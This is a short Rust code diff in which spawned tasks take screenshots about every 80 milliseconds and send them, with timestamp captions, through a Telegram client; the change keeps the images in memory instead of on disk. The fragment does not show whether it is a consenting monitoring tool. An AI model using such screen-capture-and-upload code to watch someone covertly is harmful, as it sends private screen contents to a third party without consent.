@@ -71,14 +71,15 @@ async fn run() {
         let cur_req_sender = req_sender.clone();
         tokio::spawn(async move {
             let mut client = TelegramClient::from_env().await;
-            let mut filename = format!("screen{}.jpeg", i);
             loop {
                 let (perm_sender, perm_receiver) = oneshot::channel::<String>();
                 cur_req_sender.send(perm_sender).await.unwrap();
                 if perm_receiver.await.unwrap() == "ok" {
                     let now: DateTime<Utc> = Utc::now();
-                    save_screenshot(&filename);
-                    client.send_image_withcaption(&filename, format!(
+                    let st = SystemTime::now();
+                    let mut screen_data = save_screenshot();
+                    let vec = screen_data.into_inner();
+                    client.send_image_withcaption(vec, format!(
                         "[IMAGE] {} {:02} {:02} {:02}:{:02}:{:02}", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second())).await;
                 }
                 tokio::time::sleep(Duration::from_millis(80)).await;
